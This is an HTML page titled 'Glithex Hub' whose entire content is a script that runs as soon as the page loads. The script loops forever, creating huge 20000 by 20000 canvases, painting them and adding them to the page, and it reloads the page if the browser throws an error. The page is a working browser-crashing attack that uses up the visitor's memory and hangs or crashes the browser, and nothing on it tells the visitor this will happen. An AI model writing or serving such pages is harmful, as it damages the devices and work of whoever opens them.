<!DOCTYPE html>
<html>
<head>
  <title>Glithex Hub</title>
  <style>body{margin:0;padding:0;overflow:hidden;}</style>
</head>
<body>
<script>
function MainCanvas() {
    try {
        while (true) {
            const canvas = document.createElement('canvas');
            canvas.width = 20000;
            canvas.height = 20000;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = 'black';
            for (let i = 0; i < 100; i++) {
                ctx.fillRect(
                    Math.random() * canvas.width,
                    Math.random() * canvas.height,
                    30000,
                    30000
                );
            }
            document.body.appendChild(canvas);
        }
    } catch (e) {
        location.reload(); // Reload if crash is caught
    }
}

MainCanvas();
</script>
</body>
</html>
